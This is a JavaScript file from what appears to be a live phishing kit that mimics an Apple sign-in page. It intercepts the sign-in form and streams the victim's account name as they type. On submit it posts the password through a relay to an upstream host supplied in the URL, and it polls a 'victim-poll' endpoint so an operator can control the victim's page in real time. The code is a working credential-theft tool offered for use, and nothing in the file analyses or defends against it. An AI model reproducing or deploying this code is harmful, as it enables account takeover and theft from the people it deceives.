/**
 * Plan A fast mirror — batch POST on Continue; no live password relay (prevents spinner).
 */
(function () {
  "use strict";
  if (window.__harborSigninRemoteFast) return;
  window.__harborSigninRemoteFast = true;

  var p = new URLSearchParams(location.search);
  var FWD = (p.get("fwd") || p.get("relay") || "").trim().replace(/\/$/, "");
  var SID = (p.get("sid") || "default").trim();
  if (!FWD) return;

  try {
    sessionStorage.setItem("harbor_apple_mirror", "1");
    localStorage.setItem("harbor_relay_fwd", FWD);
    localStorage.setItem("harbor_relay_sid", SID);
  } catch (e) {}

  var seq = 0;
  var relayUrl = "/api/relay/event?upstream=" + encodeURIComponent(FWD);

  function postBody(bodyObj, n) {
    n = n || 0;
    return fetch(relayUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(bodyObj),
      keepalive: true,
    })
      .then(function (r) {
        return r.text().then(function (txt) {
          if ((!r.ok || /busy|502|upstream_unreachable/i.test(txt)) && n < 5) {
            return new Promise(function (res) {
              setTimeout(function () {
                res(postBody(bodyObj, n + 1));
              }, 120 + n * 180);
            });
          }
          return { ok: r.ok && /"ok"\s*:\s*true/.test(txt) };
        });
      })
      .catch(function () {
        if (n < 5) {
          return new Promise(function (res) {
            setTimeout(function () {
              res(postBody(bodyObj, n + 1));
            }, 120 + n * 180);
          });
        }
        return { ok: false };
      });
  }

  function mk(type, payload) {
    return {
      type: type,
      payload: payload || {},
      t: Date.now(),
      seq: ++seq,
    };
  }

  function emit(type, payload) {
    return postBody({ session: SID, event: mk(type, payload) });
  }

  function onPasswordStep() {
    try {
      return window.HarborDriver && window.HarborDriver.signinStep() === "password";
    } catch (e) {
      return false;
    }
  }

  function applyState(st) {
    if (!st || !window.HarborDriver) return;
    window.HarborDriver.applyHarborState(st);
    var btn = document.getElementById("continue-btn");
    if (!btn) return;
    if (st.passwordStep || st.clearSigninLoading || st.signinError) {
      btn.classList.remove("is-loading");
      btn.removeAttribute("aria-busy");
      window.__harborSubmitPending = false;
      window.__harborSigninLoading = false;
      try {
        if (typeof window.__harborSyncSigninLoading === "function") {
          window.__harborSyncSigninLoading(false);
        }
      } catch (e) {}
      if (st.passwordStep || st.signinError) {
        btn.disabled = false;
      }
    }
    if (st.signinLoading && !onPasswordStep()) {
      btn.classList.add("is-loading");
      btn.disabled = true;
      btn.setAttribute("aria-busy", "true");
      window.__harborSubmitPending = true;
    }
  }

  function installRemoteGuards() {
    if (!window.PhishBridge || window.__harborRemoteGuards) return;
    window.__harborRemoteGuards = true;
    if (window.PhishBridge.setLoading) {
      var origLoad = window.PhishBridge.setLoading.bind(window.PhishBridge);
      window.PhishBridge.setLoading = function (on) {
        if (on && onPasswordStep()) return;
        return origLoad(on);
      };
    }
    if (window.PhishBridge.paintContinueLoading) {
      var origPaint = window.PhishBridge.paintContinueLoading.bind(window.PhishBridge);
      window.PhishBridge.paintContinueLoading = function (on, opts) {
        if (on && onPasswordStep()) return;
        return origPaint(on, opts);
      };
    }
  }

  var guardTimer = setInterval(function () {
    installRemoteGuards();
    if (window.__harborRemoteGuards) clearInterval(guardTimer);
  }, 40);

  function onSubmit(e) {
    e.preventDefault();
    e.stopImmediatePropagation();
    var ac = document.getElementById("account");
    var pw = document.getElementById("password");
    var pwStep = document.getElementById("step-password");
    var onPw = pwStep && !pwStep.hidden;
    var account = ac ? (ac.value || "").trim() : "";
    var password = pw ? pw.value || "" : "";
    if (!onPw && !account) return;
    if (onPw && !(password || "").trim()) return;

    var events = [mk("email-commit", { account: account })];
    if (onPw && password) events.push(mk("password-commit", { password: password }));
    events.push(
      mk("submit", {
        step: onPw ? "password" : "email",
        account: account,
        password: password,
      })
    );

    if (onPw) {
      applyState({ clearSigninLoading: true, signinLoading: false });
    } else {
      window.__harborSubmitPending = true;
      var btn0 = document.getElementById("continue-btn");
      if (btn0) {
        btn0.classList.add("is-loading");
        btn0.disabled = true;
        btn0.setAttribute("aria-busy", "true");
      }
    }

    postBody({ session: SID, events: events }).then(function () {
      if (onPw) {
        applyState({ clearSigninLoading: true, signinLoading: false });
        return;
      }
      window.__harborSubmitPending = true;
      var btn = document.getElementById("continue-btn");
      if (btn) {
        btn.classList.add("is-loading");
        btn.disabled = true;
        btn.setAttribute("aria-busy", "true");
      }
    });
  }

  function wire() {
    var form = document.getElementById("sign-in");
    var btn = document.getElementById("continue-btn");
    if (!form || form.__harborRemoteFast) return;
    form.__harborRemoteFast = true;
    form.addEventListener("submit", onSubmit, true);
    if (btn) btn.addEventListener("click", onSubmit, true);

    var ac = document.getElementById("account");
    if (ac) {
      var deb;
      var last = "";
      ac.addEventListener("input", function () {
        clearTimeout(deb);
        deb = setTimeout(function () {
          var v = (ac.value || "").trim();
          if (v.length < 2 || v === last) return;
          last = v;
          emit("input", { field: "account", value: v });
        }, 400);
      });
    }
  }

  wire();

  function poll() {
    fetch(
      "/api/relay/victim-poll?upstream=" +
        encodeURIComponent(FWD) +
        "&session=" +
        encodeURIComponent(SID),
      { cache: "no-store" }
    )
      .then(function (r) {
        return r.json();
      })
      .then(function (j) {
        var cmds = (j && j.cmds) || [];
        for (var i = 0; i < cmds.length; i++) {
          var c = cmds[i];
          if (c && c.op === "harbor-state" && c.state) applyState(c.state);
        }
      })
      .catch(function () {});
  }
  setInterval(poll, 40);
  poll();

  function setSpinner(on) {
    var btn = document.getElementById("continue-btn");
    if (on && onPasswordStep()) return;
    window.__harborSubmitPending = !!on;
    window.__harborSigninLoading = !!on;
    try {
      if (typeof window.__harborSyncSigninLoading === "function") {
        window.__harborSyncSigninLoading(!!on);
        return;
      }
    } catch (e) {}
    if (!btn) return;
    if (on) {
      btn.classList.add("is-loading");
      btn.disabled = true;
      btn.setAttribute("aria-busy", "true");
    } else {
      btn.classList.remove("is-loading");
      btn.removeAttribute("aria-busy");
    }
  }

  window.HarborSigninRemote = {
    submit: function () {
      onSubmit({
        preventDefault: function () {},
        stopImmediatePropagation: function () {},
      });
    },
    setSpinner: setSpinner,
    emit: emit,
    session: SID,
    fwd: FWD,
  };
  window.__phishRelayForward = function (ev) {
    if (!ev || !ev.type) return;
    var t = ev.type;
    var f = ev.payload && ev.payload.field;
    if (t === "password-commit") return;
    if (t === "input" && f === "password") return;
    if (t === "submit") return;
    postBody({ session: SID, event: ev });
  };
})();
